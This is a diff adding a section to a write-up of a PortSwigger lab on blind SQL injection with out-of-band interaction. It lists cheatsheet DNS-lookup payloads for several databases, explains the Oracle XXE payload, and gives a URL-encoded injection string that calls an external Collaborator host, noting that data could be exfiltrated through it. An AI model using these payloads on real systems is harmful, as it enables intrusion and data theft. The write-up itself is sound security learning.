@@ -606,3 +606,95 @@ Sorting by response time, we can now find the 20 characters that make up the `ad
 > `2azn1z8799x671498qh5`
 
 Now we can log in and finish the lab!
+
+---
+
+## 16. Blind SQL injection with out-of-band interaction.
+<img src="./xxe-blind.png", width=400>
+
+### Description
+This was a **huge** difficulty leap.
+
+For this question, we are given a more "secure" application, in that:
+- It does not expose any query responses.
+- It does not expose any query errors.
+- It does not expose any time delays as the requests are performed asynchronously.
+However, it is still succeptible to SQL injection.
+
+### Solution
+For this, I had to refer to the cheatsheet prepared by PortSwigger for forced DNS lookup payloads:
+
+> **Oracle** (patched)
+> ```sql
+> SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://> BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+> ```
+> 
+> **Oracle** (unpatched, requires elevated privileges)
+> ```sql
+> SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
+> ```
+> 
+> **Microsoft**
+> ```sql
+> exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
+> ```
+> 
+> **PostgreSQL**
+> ```sql
+> copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
+> ```
+> 
+> **MySQL** (windows-only)
+> ```sql
+> LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
+> SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
+> ```
+
+However, obviously using these payloads will solve the labs as-is. Therefore, I will explain the most complex one of the bunch (as the others are simply built-in host-lookup functions or program calls), which is the XXE attack on older Oracle DBs.
+
+> ```sql
+> SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+> ```
+
+We can break this up into multiple parts. First, the wrapping query:
+> ```sql
+> SELECT EXTRACTVALUE(XMLTYPE(...), '/l') FROM dual
+> ```
+This query uses the `EXTRACTVALUE` command to force Oracle to evalute the XML expression contained inside. Other commands that accept XMLTYPE inputs may also work. `FROM dual` is required in Oracle when pulling from a "void" table.
+
+The `/l` path here is just a path to validate the syntax of the `EXTRACTVALUE` command. It means to extract the root element named `<l>`. However, this element will not necessarily exist after `XMLTYPE(...)` is parsed.
+
+The most interesting part of this is the XML declaration:
+> ```sql
+> XMLTYPE('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>')
+> ```
+
+There are two main parts to this command:
+1. The XML declaration 
+> ```xml
+> <?xml version="1.0" encoding="UTF-8"?>
+> ```
+This simply defines the XML version and the encoding it uses.
+
+2. The Document Type Definition (DTD)
+> ```xml
+> <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>
+> ```
+The `DOCTYPE` keyword here defines the root element as `<root>`. The most interesting part is in the DTD subset. The keyword `ENTITY` defines something analogous to a "variable" in programming, with `% remote` being its variable name. The macro `%remote` here will use the `SYSTEM` keyword to access the path provided as its input, which is `http://BURP-COLLABORATOR-SUBDOMAIN`. After that, we can observe that the DTD subset calls the `%remote` macro, completing the XXE attack.
+
+Essentially, this means that once this XML fragment is parsed, the parser may resolve the `%remote` macro to perform a nameserver lookup for the host we've provided. What's interesting is that this probably means we could exfiltrate data by attaching it as a subdomain to the host.
+
+To completely solve the lab, I needed to use Burp's Collaborator to generate a "disposable" hostname that I'll input into Repeater:
+<img src="./xxe-blind-gen-collab.png" width=400>
+
+It really was as easy as the image implies. After I've copied that, I substitute the filler text in the cheatsheet payload, URL-encode it, then attach it to a concatenation:
+> ```sql
+> '||(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://6iptfgy34wkbg3nzgljo5hykjbp2dw1l.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual)+--+;
+> ```
+
+Once a response was received, I can check back on Collaborator to see what sort of requests I've received:
+<img src="./xxe-blind-collab.png" width=400>
+
+As seen, Collaborator received a total of four DNS-related interactions from the lab application. What's interesting is that the subdomain of the Collaborator host is noted down as "payload," which could mean that we'll use the subdomain to exfiltrate information in the future.
+
+But for now, lab complete!
